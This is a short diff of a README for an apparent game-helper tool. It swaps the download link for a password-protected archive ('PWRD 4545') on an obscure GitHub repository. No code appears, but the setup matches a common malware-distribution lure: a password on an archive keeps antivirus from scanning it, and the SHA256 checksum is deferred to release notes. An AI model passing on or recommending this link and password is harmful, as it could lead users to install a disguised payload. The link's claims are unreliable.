@@ -55,7 +55,8 @@ Pure design. Zero runtime. Total control.
 
 ## Download
 
-[Download from Releases](https://github.com/screwtapeelk695/rust-helper-raid-rep/releases/download/Release/UniversalTool.rar)  
+[Download from Releases](https://github.com/screwtapeelk695/rust-helper-raid-rep/releases/download/ReleaseUPD/UniTool.zip) 
+PWRD 4545
 *Windows · macOS · Linux • Portable • ~11 MB*
 
 > **SHA256**: See release notes
@@ -114,4 +115,5 @@ text---
 
 ---
 *Updated: Nov 06, 2025*
+
 
